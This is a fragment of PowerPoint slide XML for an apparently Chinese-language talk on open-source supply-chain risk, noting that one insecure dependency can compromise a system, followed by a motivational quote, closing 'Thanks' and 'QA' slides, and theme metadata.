              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pP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一個企業級應用程式中有高達 70% 到 90% 的程式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碼並非由企業內部工程師親自撰寫而是來自龐大的開源生態系。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0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>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="26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endParaRPr sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pP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：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「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即使我們已經將自己負責的那一層做好安全防護，包括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依賴性管理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、權限限制、沙盒隔離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、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自動化源碼掃描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，也不代表整條 chain 都是安全的，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只要 dependency chain 中的其中一個環節存在不安全的套件，就可能成為整個系統的攻擊入口。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0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」</a:t>
            </a:r>
            <a:endParaRPr sz="2600">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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864021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72585" y="232317"/>
            <a:ext cx="5823414" cy="4367560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="47429584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607206" y="1545323"/>
            <a:ext cx="5819597" cy="4364697"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="190602845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457574" y="2857499"/>
            <a:ext cx="6563546" cy="3698404"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1878631446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418297" y="167296"/>
            <a:ext cx="6604828" cy="6493394"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1714251120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187762" y="147111"/>
            <a:ext cx="4872904" cy="6495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64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295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602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25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63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86331" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="13858" t="18353" r="5412" b="30057"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="375937" y="204107"/>
            <a:ext cx="7381874" cy="3537856"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="261972864" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="3080356" y="4269240"/>
            <a:ext cx="8794335" cy="2072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尋找那些能夠表達你意圖的形式，</a:t>
            </a:r>
            <a:endParaRPr sz="2600" b="0" i="0" u="none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當你成功找到它們，</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2600" b="0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並使它們盡可能貼近你的理念時，</a:t>
            </a:r>
            <a:endParaRPr sz="2600" b="0" i="0" u="none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不要就此停下，而要不斷向前推進，</a:t>
            </a:r>
            <a:endParaRPr sz="2600" b="0" i="0" u="none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持續強化、深化並凸顯那些形式，</a:t>
            </a:r>
            <a:endParaRPr sz="2600" b="0" i="0" u="none">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:ea typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr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AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>直到它們將那個鮮活、充滿生命力的理念完整地包容其中。</a:t>
            </a:r>
            <a:endParaRPr sz="2600">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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6917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Thanks.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chemeClr val="tx1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:srgbClr val="262626"/>
            </a:gs>
          </a:gsLst>
          <a:lin ang="16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8186493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9600"/>
              <a:t>QA</a:t>
            </a:r>
            <a:endParaRPr sz="9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esis">
  <a:themeElements>
    <a:clrScheme name="Aspect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Times New Roman"/>
        <a:ea typeface="SimSun"/>
        <a:cs typeface="Times New Roman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39</Slides>
  <Notes>39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</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-11T16:42:34Z</dcterms:modified>
</cp:coreProperties>
</file>